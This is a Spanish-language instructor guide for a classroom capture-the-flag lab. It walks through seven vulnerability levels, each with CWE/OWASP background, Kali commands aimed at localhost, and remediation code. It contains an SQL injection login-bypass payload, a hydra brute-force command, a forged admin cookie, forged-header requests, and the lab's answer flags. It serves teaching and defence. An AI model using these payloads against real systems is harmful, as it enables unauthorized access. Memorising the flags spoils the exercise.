# GUÍA DEL INSTRUCTOR // CYBER LAB CTF (2º SMR)

Documento pedagógico y técnico de referencia para el profesorado del módulo de **Seguridad Informática (SI)** y los alumnos de 2º SMR (Sistemas Microinformáticos y Redes).
Detalla la fundamentación teórica (CWE / OWASP), el uso de herramientas de **Kali Linux / Ubuntu** en el emulador de terminal, los pasos de explotación y el código de remediación en producción.

---

## Índice Curricular de Niveles, Herramientas Kali y Banderas

| Nivel | Categoría & CWE | Herramientas Kali / Terminal | Flag Oficial | Puntos |
| :--- | :--- | :--- | :--- | :--- |
| **1** | Reconocimiento (`CWE-200`) | `nmap`, `gobuster`, `nikto`, `curl` | `FLAG{DOM_C0MM3NTS_4ND_R0B0TS}` | 100 |
| **2** | Validación Cliente (`CWE-602`) | `curl` (payload JSON), DevTools | `FLAG{N3V3R_TRUST_CL13NT_S1D3}` | 150 |
| **3** | Sesiones Inseguras (`CWE-565`) | `base64 -d`, `base64` en consola | `FLAG{C00K13_T4MP3R1NG_SUCC3SS}` | 200 |
| **4** | Control de Acceso IDOR (`CWE-639`) | `curl -i`, `ffuf` (fuzzing) | `FLAG{1D0R_4P1_BR0K3N_0BJ3CT}` | 250 |
| **5** | Inyección SQL (`CWE-89`) | `sqlmap` (simulado), payloads `' OR 1=1 --` | `FLAG{S4N1T1Z3_Y0UR_1NPUTS_SQL1}` | 300 |
| **6** | Autenticación Rota (`CWE-307`) | `hydra`, `cat` (wordlists) | `FLAG{BR0K3N_4UTH_JWT_N0N3}` | 350 |
| **7** | Cadena Completa (`CWE-269`) | `gobuster`, `curl` con headers forjados | `FLAG{FULL_CH41N_M4ST3R_H4CK3R}` | 500 |

---

## Nivel 1: Reconocimiento y Fugas en el Código

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
- **OWASP Top 10:** A01:2021 — Broken Access Control.
- **Fundamento:** En la fase de reconocimiento (Footprinting & Enumeration), el analista busca fugas involuntarias en HTML, encabezados HTTP y ficheros de configuración (`robots.txt`, `.bak`). Los navegadores descargan todo el código sin compilar, por lo que los comentarios `<!-- -->` no ofrecen confidencialidad.

### 2. Comandos en Kali Linux / Ubuntu
```bash
# 1. Escaneo de servicios y puertos abiertos con nmap:
nmap localhost

# 2. Descubrimiento de rutas y archivos ocultos con diccionario (fuzzing):
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt

# 3. Escaneo de desconfiguraciones del servidor web con nikto:
nikto -h http://localhost

# 4. Lectura directa del archivo robots.txt en consola:
curl /lab/robots.txt
# o directamente en el sistema de archivos:
cat /var/www/html/robots.txt
```

### 3. Código de Remediación Defensiva
```javascript
// next.config.ts / webpack.config.js
module.exports = {
  compiler: {
    removeConsole: process.env.NODE_ENV === 'production',
  },
};

// Configuración Nginx (/etc/nginx/sites-available/default):
// Denegar el acceso a archivos de backup y configuración:
location ~* \.(bak|config|sql|old|txt|log)$ {
  deny all;
  return 404;
}
```

---

## Nivel 2: El Cliente No Es De Fiar (Client-Side Validation Bypass)

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security).
- **OWASP Top 10:** A04:2021 — Insecure Design.
- **Fundamento:** Principio de autoridad del servidor. El frontend es un entorno hostil bajo el control físico del usuario. Cualquier validación hecha únicamente en HTML o JavaScript (`disabled`, `type="hidden"`, variables en cliente) puede ser eludida en segundos.

### 2. Comandos en Kali Linux / Ubuntu
```bash
# Envío de petición HTTP directa ignorando el frontend:
curl -X POST http://localhost/api/checkout -d "price=0&itemId=cert-sec-01"
```

### 3. Código de Remediación Defensiva
```typescript
import { z } from "zod";

const OrderSchema = z.object({
  itemId: z.string().uuid(),
  // ¡El precio NUNCA se acepta desde el cliente!
});

export async function POST(req: Request) {
  const session = await auth.getSession(req);
  if (!session) return Response.json({ error: "No autenticado" }, { status: 401 });

  const { itemId } = OrderSchema.parse(await req.json());
  
  // Consultar precio y saldo en la base de datos:
  const product = await db.products.findById(itemId);
  const user = await db.users.findById(session.userId);

  if (user.balance < product.officialPrice) {
    return Response.json({ error: "Saldo insuficiente" }, { status: 400 });
  }

  await db.transactPayment(user.id, product.officialPrice);
  return Response.json({ success: true });
}
```

---

## Nivel 3: Cookies Inseguras y Manipulación de Sesión

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-565 (Reliance on Cookies without Validation) & CWE-384 (Session Fixation).
- **OWASP Top 10:** A07:2021 — Identification and Authentication Failures.
- **Fundamento:** Diferencia entre codificación (Base64) y firma/cifrado criptográfico. Base64 solo transforma bytes a texto ASCII; si una cookie no tiene firma (HMAC-SHA256) ni flag `HttpOnly`, el cliente puede alterar los datos y elevar privilegios.

### 2. Comandos en Kali Linux / Ubuntu
```bash
# 1. Decodificar la cookie de sesión capturada:
echo "eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCJ9" | base64 -d
# Salida: {"user":"student","role":"guest"}

# 2. Codificar el nuevo payload forjado con rol admin:
echo -n '{"user":"student","role":"admin"}' | base64
# Salida: eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJhZG1pbiJ9
```

### 3. Código de Remediación Defensiva
```typescript
import crypto from "crypto";

export function createSecureSessionCookie(payload: { userId: string; role: string }) {
  const secret = process.env.SESSION_SECRET; // Mínimo 32 bytes criptográficos
  const data = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const signature = crypto.createHmac("sha256", secret).update(data).digest("base64url");

  return {
    name: "auth_session",
    value: `${data}.${signature}`,
    httpOnly: true, // Impide el robo o lectura desde JavaScript (document.cookie)
    secure: true,   // Exige HTTPS
    sameSite: "lax",
    maxAge: 60 * 60 * 12,
  };
}
```

---

## Nivel 4: Insecure Direct Object References (IDOR)

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key).
- **OWASP Top 10:** A01:2021 — Broken Access Control.
- **Fundamento:** Ocurre cuando un endpoint REST expone un recurso directamente mediante un ID (`?id=1042`) sin verificar que el usuario que lo solicita tenga derechos de acceso sobre dicho registro.

### 2. Comandos en Kali Linux / Ubuntu
```bash
# 1. Petición inspeccionando cabeceras y cuerpo con curl:
curl -i "http://localhost/api/mock/invoices?id=1001"

# 2. Fuzzing de identificadores de API en Kali con ffuf:
ffuf -w ids.txt -u "http://localhost/api/mock/invoices?id=FUZZ"
```

### 3. Código de Remediación Defensiva
```typescript
export async function GET(req: Request) {
  const session = await auth.getSession(req);
  if (!session) return Response.json({ error: "No autorizado" }, { status: 401 });

  const invoiceId = Number(new URL(req.url).searchParams.get("id"));

  // ¡CRÍTICO! La consulta exige que el recurso pertenezca al usuario de la sesión:
  const invoice = await db.invoices.findFirst({
    where: {
      id: invoiceId,
      ownerId: session.userId, // Control de acceso contextual obligatorio
    },
  });

  if (!invoice) return Response.json({ error: "No encontrado" }, { status: 404 });
  return Response.json(invoice);
}
```

---

## Nivel 5: Inyecciones SQL (SQLi)

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command).
- **OWASP Top 10:** A03:2021 — Injection.
- **Fundamento:** Concatenar cadenas de texto en sentencias SQL permite a caracteres como comillas simples (`'`) romper la estructura sintáctica e inyectar operadores lógicos (`OR 1=1`) y comentarios (`--`).

### 2. Comandos en Kali Linux / Ubuntu
```bash
# 1. Auditoría automática con sqlmap en Kali Linux:
sqlmap -u "http://localhost/login" --data="username=admin&password=x" --batch

# 2. Payload manual de bypass de autenticación:
# Usuario: ' OR '1'='1' --
# Contraseña: (cualquiera)
```

### 3. Código de Remediación Defensiva
```typescript
import { Pool } from "pg";
const pool = new Pool();

export async function loginUser(username: string, passwordHash: string) {
  // Los parámetros $1 y $2 se envían al motor SQL de forma aislada.
  // Cualquier comilla simple se procesa como texto literal plano:
  const query = "SELECT id, username, role FROM users WHERE username = $1 AND password_hash = $2";
  const { rows } = await pool.query(query, [username, passwordHash]);
  return rows[0] || null;
}
```

---

## Nivel 6: Autenticación Rota y Fuerza Bruta

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts).
- **OWASP Top 10:** A07:2021 — Identification and Authentication Failures.
- **Fundamento:** Endpoints sin rate limiting permiten a herramientas automatizadas probar diccionarios de contraseñas débiles hasta encontrar la correcta en cuestión de segundos.

### 2. Comandos en Kali Linux / Ubuntu
```bash
# 1. Inspección de listas de contraseñas:
cat /opt/wordlists/passwords.txt

# 2. Ataque de fuerza bruta multi-hilo con THC-Hydra:
hydra -l admin -P /opt/wordlists/passwords.txt http-post-form "/api/mock/auth:username=^USER^&password=^PASS^:F=401"

# 3. Petición POST manual con curl:
curl -X POST /api/mock/auth -d "username=admin&password=hunter2"
```

### 3. Código de Remediación Defensiva
```typescript
import bcrypt from "bcrypt";
import { rateLimiter } from "@/lib/rateLimit";

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for") || "unknown";

  // Máximo 5 intentos cada 15 minutos por IP
  const isAllowed = await rateLimiter.checkLimit(ip, { maxAttempts: 5, windowMs: 15 * 60 * 1000 });
  if (!isAllowed) {
    return Response.json({ error: "Demasiados intentos. Bloqueado temporalmente." }, { status: 429 });
  }

  const { username, password } = await req.json();
  const user = await db.users.findUnique({ where: { username } });

  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return Response.json({ error: "Credenciales erróneas." }, { status: 401 });
  }

  return Response.json({ success: true, token: issueSecureJwt(user) });
}
```

---

## Nivel 7: Cadena de Ataque Final (Full Exploit Chain)

### 1. Concepto Pedagógico & Estándares
- **CWE:** CWE-269 (Improper Privilege Management).
- **OWASP Top 10:** A01:2021 & A04:2021.
- **Fundamento:** Encadenamiento de múltiples debilidades (Fuga en código -> IDOR en API interna -> Forja de cabeceras HTTP perimetrales) para comprometer el mainframe central.

### 2. Comandos en Kali Linux / Ubuntu
```bash
# Paso 1: Fuzzing para descubrir APIs internas:
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt

# Paso 2: Consulta del endpoint de personal para obtener credenciales del CISO:
curl http://localhost/api/mock/staff?dept=security

# Paso 3: Envío de petición con cabeceras forjadas al panel de contingencia:
curl -H "X-Employee-Id: sec-9902" -H "Authorization: Bearer emergency_override_2026" http://localhost/api/mock/admin/flag
```

### 3. Código de Remediación Defensiva
```typescript
export async function GET(req: Request) {
  // Modelo Zero Trust: Cero confianza en cabeceras HTTP arbitrarias del cliente.
  // Validación de identidad contra proveedor OIDC firmado:
  const session = await verifySignedOidcSession(req);
  if (!session || session.role !== "ciso") {
    return Response.json({ error: "Acceso denegado: se requiere rol de CISO" }, { status: 403 });
  }

  // Verificación de segundo factor (MFA) en tiempo real:
  const isMfaValid = await verifyMfaChallenge(session.userId);
  if (!isMfaValid) {
    return Response.json({ error: "Se requiere autenticación multifactor activa" }, { status: 401 });
  }

  return Response.json({ status: "Acceso concedido", secret: "..." });
}
```

---

*Material didáctico oficial para 2º SMR · Aula 35 · Módulo de Seguridad Informática.*
